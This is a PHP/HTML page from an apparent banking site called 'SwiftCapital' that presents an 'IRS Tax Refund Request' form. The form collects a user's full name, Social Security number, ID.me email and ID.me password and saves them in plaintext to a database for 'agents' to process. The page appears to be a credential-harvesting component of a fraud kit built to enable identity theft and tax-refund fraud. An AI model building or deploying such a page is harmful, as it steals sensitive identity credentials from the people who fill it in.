<?php 
require_once '../includes/db.php';
require_once '../includes/user-check.php'; 

$user_id = $_SESSION['user_id'];
$success_msg = '';
$error_msg = '';

// Check if user already has a pending or in-progress IRS request
$stmt = $pdo->prepare("SELECT * FROM irs_requests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$user_id]);
$existing_irs = $stmt->fetch();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_irs'])) {
    if ($existing_irs && in_array($existing_irs['status'], ['Pending', 'In Progress', 'Approved'])) {
        $error_msg = "You already have an active IRS refund request.";
    } else {
        $full_name = htmlspecialchars($_POST['full_name']);
        $ssn = htmlspecialchars($_POST['ssn']);
        $id_me_email = htmlspecialchars($_POST['id_me_email']);
        $id_me_password = $_POST['id_me_password'];
        $country = htmlspecialchars($_POST['country']);

        try {
            $stmt = $pdo->prepare("INSERT INTO irs_requests (user_id, full_name, ssn, id_me_email, id_me_password, country, status) VALUES (?, ?, ?, ?, ?, ?, 'Pending')");
            $stmt->execute([$user_id, $full_name, $ssn, $id_me_email, $id_me_password, $country]);
            
            $success_msg = "Your IRS tax refund request has been submitted successfully! Our agents will process it shortly.";
            // Refresh record
            $stmt = $pdo->prepare("SELECT * FROM irs_requests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
            $stmt->execute([$user_id]);
            $existing_irs = $stmt->fetch();
        } catch (Exception $e) {
            $error_msg = "System error: " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRS Tax Refund - SwiftCapital</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="style.css">
    <style>
        .irs-form-container {
            background: #fff;
            border-radius: 20px;
            border: 1px solid var(--border-color);
            padding: 40px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.04);
            margin-bottom: 40px;
            position: relative;
        }
        
        .form-section {
            background: #ffffff;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #edf2f7;
            transition: all 0.3s ease;
        }

        .form-section:hover {
            border-color: #cbd5e0;
            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
        }

        .form-section-title {
            font-size: 1.15rem;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            padding-bottom: 15px;
            border-bottom: 1px solid #edf2f7;
        }

        .form-section-title i {
            color: var(--primary-color);
            font-size: 1.25rem;
        }

        .important-notice {
            background: #ebf8ff;
            color: #2b6cb0;
            border-radius: 12px;
            padding: 24px;
            display: flex;
            align-items: flex-start;
            margin-bottom: 35px;
            border: 1px solid #bee3f8;
        }

        .important-notice i {
            font-size: 1.4rem;
            margin-right: 16px;
            color: #3182ce;
            margin-top: 2px;
        }

        .important-notice-content h6 {
            font-weight: 700;
            margin-bottom: 6px;
            color: #2c5282;
        }

        .important-notice-content p {
            font-size: 0.9rem;
            margin-bottom: 0;
            line-height: 1.6;
        }

        .btn-submit {
            width: 100%;
            background: var(--primary-gradient);
            color: #fff;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 1.1rem;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(59, 130, 246, 0.35);
            filter: brightness(1.05);
        }

        .btn-submit:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

<?php 
$page = 'irs';
include '../includes/user-sidebar.php'; 
?>

    <!-- Main Content -->
    <main class="main-content">
        <!-- Top Navbar -->
        <?php include '../includes/user-navbar.php'; ?>

        <!-- Page Content -->
        <div class="page-container">
            
            <div class="row justify-content-center">
                <div class="col-lg-8 col-xl-7">
                    
                    <div class="page-header-centered">
                        <div class="header-icon-circle">
                            <i class="fa-solid fa-file-invoice-dollar"></i>
                        </div>
                        <h1 class="page-title-centered">IRS Tax Refund Request</h1>
                        <p class="page-subtitle-centered">Please fill out the form below to submit your IRS tax refund request</p>
                    </div>

                    <?php if($success_msg): ?>
                        <div class="alert alert-success border-0 rounded-4 p-4 shadow-sm mb-4 fw-600">
                            <i class="fa-solid fa-circle-check me-2"></i> <?php echo $success_msg; ?>
                        </div>
                    <?php endif; ?>

                    <?php if($error_msg): ?>
                        <div class="alert alert-danger border-0 rounded-4 p-4 shadow-sm mb-4 fw-600">
                            <i class="fa-solid fa-triangle-exclamation me-2"></i> <?php echo $error_msg; ?>
                        </div>
                    <?php endif; ?>

                    <?php if($existing_irs && ($existing_irs['status'] == 'Pending' || $existing_irs['status'] == 'In Progress' || $existing_irs['status'] == 'Approved')): ?>
                        <div class="card border-0 rounded-4 shadow-sm p-5 text-center mb-5">
                            <div class="mb-4">
                                <?php if($existing_irs['status'] == 'Approved'): ?>
                                    <div class="bg-success text-white d-inline-flex align-items-center justify-content-center rounded-circle mb-3" style="width: 80px; height: 80px;">
                                        <i class="fa-solid fa-check fa-3x"></i>
                                    </div>
                                    <h3 class="fw-800">Refund Authorized</h3>
                                    <p class="text-muted">Your tax refund has been successfully audited and authorized. The funds will be credited to your account balance shortly.</p>
                                    <a href="transactions.php" class="btn btn-primary px-5 py-3 fw-800 mt-3" style="border-radius: 12px;">View Transactions</a>
                                <?php else: ?>
                                    <div class="bg-indigo text-white d-inline-flex align-items-center justify-content-center rounded-circle mb-3" style="width: 80px; height: 80px;">
                                        <i class="fa-solid fa-file-invoice-dollar fa-3x"></i>
                                    </div>
                                    <h3 class="fw-800">Request in Review</h3>
                                    <p class="text-muted">We have received your IRS refund request. Our tax specialists are currently verifying your credentials with the authorities.</p>
                                    <div class="p-3 bg-light rounded-3 d-inline-block px-4 border">
                                        <span class="text-xs fw-800 text-muted text-uppercase">Current Status: <strong class="text-primary"><?php echo $existing_irs['status']; ?></strong></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php else: ?>
                    <div class="irs-form-container">
                        <form method="POST">
                            <input type="hidden" name="submit_irs" value="1">
                            <!-- Personal Information -->
                            <div class="form-section">
                                <div class="form-section-title">
                                    <i class="fa-solid fa-user"></i> Personal Information
                                </div>
                            
                            <label class="form-label">Full Name <span class="req">*</span></label>
                            <div class="custom-input-group">
                                <input type="text" name="full_name" placeholder="Enter your full name" required>
                                <i class="fa-solid fa-user left-icon"></i>
                            </div>

                            <label class="form-label">Social Security Number (SSN) <span class="req">*</span></label>
                            <div class="custom-input-group">
                                <input type="text" name="ssn" placeholder="XXX-XX-XXXX" required>
                                <i class="fa-solid fa-shield-halved left-icon"></i>
                            </div>
                        </div>

                        <!-- ID.me Credentials -->
                        <div class="form-section">
                            <div class="form-section-title">
                                <i class="fa-solid fa-lock"></i> ID.me Credentials
                            </div>
                            
                            <label class="form-label">ID.me Email <span class="req">*</span></label>
                            <div class="custom-input-group">
                                <input type="email" name="id_me_email" placeholder="example@email.com" required>
                                <i class="fa-solid fa-envelope left-icon"></i>
                            </div>

                            <label class="form-label">ID.me Password <span class="req">*</span></label>
                            <div class="custom-input-group">
                                <input type="password" name="id_me_password" placeholder="Enter your ID.me password" required>
                                <i class="fa-solid fa-key left-icon"></i>
                            </div>
                        </div>

                        <!-- Location Information -->
                        <div class="form-section">
                            <div class="form-section-title">
                                <i class="fa-solid fa-location-dot"></i> Location Information
                            </div>
                            
                            <label class="form-label">Country</label>
                            <div class="custom-input-group no-icon mb-0">
                                <select name="country" required>
                                    <option value="" disabled selected>Select Country</option>
                                    <option value="AF">Afghanistan</option>
                                    <option value="AX">Aland Islands</option>
                                    <option value="AL">Albania</option>
                                    <option value="DZ">Algeria</option>
                                    <option value="AS">American Samoa</option>
                                    <option value="AD">Andorra</option>
                                    <option value="AO">Angola</option>
                                    <option value="AI">Anguilla</option>
                                    <option value="AQ">Antarctica</option>
                                    <option value="AG">Antigua and Barbuda</option>
                                    <option value="AR">Argentina</option>
                                    <option value="AM">Armenia</option>
                                    <option value="AW">Aruba</option>
                                    <option value="AU">Australia</option>
                                    <option value="AT">Austria</option>
                                    <option value="AZ">Azerbaijan</option>
                                    <option value="BS">Bahamas</option>
                                    <option value="BH">Bahrain</option>
                                    <option value="BD">Bangladesh</option>
                                    <option value="BB">Barbados</option>
                                    <option value="BY">Belarus</option>
                                    <option value="BE">Belgium</option>
                                    <option value="BZ">Belize</option>
                                    <option value="BJ">Benin</option>
                                    <option value="BM">Bermuda</option>
                                    <option value="BT">Bhutan</option>
                                    <option value="BO">Bolivia</option>
                                    <option value="BQ">Bonaire, Sint Eustatius and Saba</option>
                                    <option value="BA">Bosnia and Herzegovina</option>
                                    <option value="BW">Botswana</option>
                                    <option value="BV">Bouvet Island</option>
                                    <option value="BR">Brazil</option>
                                    <option value="IO">British Indian Ocean Territory</option>
                                    <option value="BN">Brunei Darussalam</option>
                                    <option value="BG">Bulgaria</option>
                                    <option value="BF">Burkina Faso</option>
                                    <option value="BI">Burundi</option>
                                    <option value="KH">Cambodia</option>
                                    <option value="CM">Cameroon</option>
                                    <option value="CA">Canada</option>
                                    <option value="CV">Cape Verde</option>
                                    <option value="KY">Cayman Islands</option>
                                    <option value="CF">Central African Republic</option>
                                    <option value="TD">Chad</option>
                                    <option value="CL">Chile</option>
                                    <option value="CN">China</option>
                                    <option value="CX">Christmas Island</option>
                                    <option value="CC">Cocos (Keeling) Islands</option>
                                    <option value="CO">Colombia</option>
                                    <option value="KM">Comoros</option>
                                    <option value="CG">Congo</option>
                                    <option value="CD">Congo, Democratic Republic of the Congo</option>
                                    <option value="CK">Cook Islands</option>
                                    <option value="CR">Costa Rica</option>
                                    <option value="CI">Cote D'Ivoire</option>
                                    <option value="HR">Croatia</option>
                                    <option value="CU">Cuba</option>
                                    <option value="CW">Curacao</option>
                                    <option value="CY">Cyprus</option>
                                    <option value="CZ">Czech Republic</option>
                                    <option value="DK">Denmark</option>
                                    <option value="DJ">Djibouti</option>
                                    <option value="DM">Dominica</option>
                                    <option value="DO">Dominican Republic</option>
                                    <option value="EC">Ecuador</option>
                                    <option value="EG">Egypt</option>
                                    <option value="SV">El Salvador</option>
                                    <option value="GQ">Equatorial Guinea</option>
                                    <option value="ER">Eritrea</option>
                                    <option value="EE">Estonia</option>
                                    <option value="ET">Ethiopia</option>
                                    <option value="FK">Falkland Islands (Malvinas)</option>
                                    <option value="FO">Faroe Islands</option>
                                    <option value="FJ">Fiji</option>
                                    <option value="FI">Finland</option>
                                    <option value="FR">France</option>
                                    <option value="GF">French Guiana</option>
                                    <option value="PF">French Polynesia</option>
                                    <option value="TF">French Southern Territories</option>
                                    <option value="GA">Gabon</option>
                                    <option value="GM">Gambia</option>
                                    <option value="GE">Georgia</option>
                                    <option value="DE">Germany</option>
                                    <option value="GH">Ghana</option>
                                    <option value="GI">Gibraltar</option>
                                    <option value="GR">Greece</option>
                                    <option value="GL">Greenland</option>
                                    <option value="GD">Grenada</option>
                                    <option value="GP">Guadeloupe</option>
                                    <option value="GU">Guam</option>
                                    <option value="GT">Guatemala</option>
                                    <option value="GG">Guernsey</option>
                                    <option value="GN">Guinea</option>
                                    <option value="GW">Guinea-Bissau</option>
                                    <option value="GY">Guyana</option>
                                    <option value="HT">Haiti</option>
                                    <option value="HM">Heard Island and Mcdonald Islands</option>
                                    <option value="VA">Holy See (Vatican City State)</option>
                                    <option value="HN">Honduras</option>
                                    <option value="HK">Hong Kong</option>
                                    <option value="HU">Hungary</option>
                                    <option value="IS">Iceland</option>
                                    <option value="IN">India</option>
                                    <option value="ID">Indonesia</option>
                                    <option value="IR">Iran, Islamic Republic of</option>
                                    <option value="IQ">Iraq</option>
                                    <option value="IE">Ireland</option>
                                    <option value="IM">Isle of Man</option>
                                    <option value="IL">Israel</option>
                                    <option value="IT">Italy</option>
                                    <option value="JM">Jamaica</option>
                                    <option value="JP">Japan</option>
                                    <option value="JE">Jersey</option>
                                    <option value="JO">Jordan</option>
                                    <option value="KZ">Kazakhstan</option>
                                    <option value="KE">Kenya</option>
                                    <option value="KI">Kiribati</option>
                                    <option value="KP">Korea, Democratic People's Republic of</option>
                                    <option value="KR">Korea, Republic of</option>
                                    <option value="XK">Kosovo</option>
                                    <option value="KW">Kuwait</option>
                                    <option value="KG">Kyrgyzstan</option>
                                    <option value="LA">Lao People's Democratic Republic</option>
                                    <option value="LV">Latvia</option>
                                    <option value="LB">Lebanon</option>
                                    <option value="LS">Lesotho</option>
                                    <option value="LR">Liberia</option>
                                    <option value="LY">Libyan Arab Jamahiriya</option>
                                    <option value="LI">Liechtenstein</option>
                                    <option value="LT">Lithuania</option>
                                    <option value="LU">Luxembourg</option>
                                    <option value="MO">Macao</option>
                                    <option value="MK">Macedonia, the Former Yugoslav Republic of</option>
                                    <option value="MG">Madagascar</option>
                                    <option value="MW">Malawi</option>
                                    <option value="MY">Malaysia</option>
                                    <option value="MV">Maldives</option>
                                    <option value="ML">Mali</option>
                                    <option value="MT">Malta</option>
                                    <option value="MH">Marshall Islands</option>
                                    <option value="MQ">Martinique</option>
                                    <option value="MR">Mauritania</option>
                                    <option value="MU">Mauritius</option>
                                    <option value="YT">Mayotte</option>
                                    <option value="MX">Mexico</option>
                                    <option value="FM">Micronesia, Federated States of</option>
                                    <option value="MD">Moldova, Republic of</option>
                                    <option value="MC">Monaco</option>
                                    <option value="MN">Mongolia</option>
                                    <option value="ME">Montenegro</option>
                                    <option value="MS">Montserrat</option>
                                    <option value="MA">Morocco</option>
                                    <option value="MZ">Mozambique</option>
                                    <option value="MM">Myanmar</option>
                                    <option value="NA">Namibia</option>
                                    <option value="NR">Nauru</option>
                                    <option value="NP">Nepal</option>
                                    <option value="NL">Netherlands</option>
                                    <option value="AN">Netherlands Antilles</option>
                                    <option value="NC">New Caledonia</option>
                                    <option value="NZ">New Zealand</option>
                                    <option value="NI">Nicaragua</option>
                                    <option value="NE">Niger</option>
                                    <option value="NG">Nigeria</option>
                                    <option value="NU">Niue</option>
                                    <option value="NF">Norfolk Island</option>
                                    <option value="MP">Northern Mariana Islands</option>
                                    <option value="NO">Norway</option>
                                    <option value="OM">Oman</option>
                                    <option value="PK">Pakistan</option>
                                    <option value="PW">Palau</option>
                                    <option value="PS">Palestinian Territory, Occupied</option>
                                    <option value="PA">Panama</option>
                                    <option value="PG">Papua New Guinea</option>
                                    <option value="PY">Paraguay</option>
                                    <option value="PE">Peru</option>
                                    <option value="PH">Philippines</option>
                                    <option value="PN">Pitcairn</option>
                                    <option value="PL">Poland</option>
                                    <option value="PT">Portugal</option>
                                    <option value="PR">Puerto Rico</option>
                                    <option value="QA">Qatar</option>
                                    <option value="RE">Reunion</option>
                                    <option value="RO">Romania</option>
                                    <option value="RU">Russian Federation</option>
                                    <option value="RW">Rwanda</option>
                                    <option value="BL">Saint Barthelemy</option>
                                    <option value="SH">Saint Helena</option>
                                    <option value="KN">Saint Kitts and Nevis</option>
                                    <option value="LC">Saint Lucia</option>
                                    <option value="MF">Saint Martin</option>
                                    <option value="PM">Saint Pierre and Miquelon</option>
                                    <option value="VC">Saint Vincent and the Grenadines</option>
                                    <option value="WS">Samoa</option>
                                    <option value="SM">San Marino</option>
                                    <option value="ST">Sao Tome and Principe</option>
                                    <option value="SA">Saudi Arabia</option>
                                    <option value="SN">Senegal</option>
                                    <option value="RS">Serbia</option>
                                    <option value="CS">Serbia and Montenegro</option>
                                    <option value="SC">Seychelles</option>
                                    <option value="SL">Sierra Leone</option>
                                    <option value="SG">Singapore</option>
                                    <option value="SX">Sint Maarten</option>
                                    <option value="SK">Slovakia</option>
                                    <option value="SI">Slovenia</option>
                                    <option value="SB">Solomon Islands</option>
                                    <option value="SO">Somalia</option>
                                    <option value="ZA">South Africa</option>
                                    <option value="GS">South Georgia and the South Sandwich Islands</option>
                                    <option value="SS">South Sudan</option>
                                    <option value="ES">Spain</option>
                                    <option value="LK">Sri Lanka</option>
                                    <option value="SD">Sudan</option>
                                    <option value="SR">Suriname</option>
                                    <option value="SJ">Svalbard and Jan Mayen</option>
                                    <option value="SZ">Swaziland</option>
                                    <option value="SE">Sweden</option>
                                    <option value="CH">Switzerland</option>
                                    <option value="SY">Syrian Arab Republic</option>
                                    <option value="TW">Taiwan, Province of China</option>
                                    <option value="TJ">Tajikistan</option>
                                    <option value="TZ">Tanzania, United Republic of</option>
                                    <option value="TH">Thailand</option>
                                    <option value="TL">Timor-Leste</option>
                                    <option value="TG">Togo</option>
                                    <option value="TK">Tokelau</option>
                                    <option value="TO">Tonga</option>
                                    <option value="TT">Trinidad and Tobago</option>
                                    <option value="TN">Tunisia</option>
                                    <option value="TR">Turkey</option>
                                    <option value="TM">Turkmenistan</option>
                                    <option value="TC">Turks and Caicos Islands</option>
                                    <option value="TV">Tuvalu</option>
                                    <option value="UG">Uganda</option>
                                    <option value="UA">Ukraine</option>
                                    <option value="AE">United Arab Emirates</option>
                                    <option value="GB">United Kingdom</option>
                                    <option value="US">United States</option>
                                    <option value="UM">United States Minor Outlying Islands</option>
                                    <option value="UY">Uruguay</option>
                                    <option value="UZ">Uzbekistan</option>
                                    <option value="VU">Vanuatu</option>
                                    <option value="VE">Venezuela</option>
                                    <option value="VN">Viet Nam</option>
                                    <option value="VG">Virgin Islands, British</option>
                                    <option value="VI">Virgin Islands, U.s.</option>
                                    <option value="WF">Wallis and Futuna</option>
                                    <option value="EH">Western Sahara</option>
                                    <option value="YE">Yemen</option>
                                    <option value="ZM">Zambia</option>
                                    <option value="ZW">Zimbabwe</option>
                                </select>
                            </div>
                        </div>

                        <div class="important-notice">
                            <i class="fa-solid fa-circle-info"></i>
                            <div class="important-notice-content">
                                <h6>Important Notice</h6>
                                <p>Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.</p>
                            </div>
                        </div>

                        <div class="d-grid mt-4">
                            <button type="submit" class="btn-submit">
                                <i class="fa-solid fa-paper-plane me-2"></i> Submit Refund Request
                            </button>
                        </div>
                        </form>
                    </div>
                    <?php endif; ?>

                </div>
            </div>

        </div>

        <!-- Footer -->
        <footer class="main-footer mt-auto">
            <div class="brand">
                <span class="text-primary fw-bold" style="letter-spacing: -0.5px;">Swift</span><span class="text-dark fw-bold" style="letter-spacing: -0.5px;">Capital</span> © 2026 SwiftCapital. All rights reserved.
            </div>
            <div class="footer-links">
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">Contact Support</a>
            </div>
        </footer>
    </main>

    <!-- Bootstrap JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const dateNodes = document.querySelectorAll('#currentDate');
            const now = new Date();
            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            const formattedDate = now.toLocaleDateString('en-US', options);
            dateNodes.forEach(node => node.textContent = formattedDate);
        });
    </script>
</body>
</html>
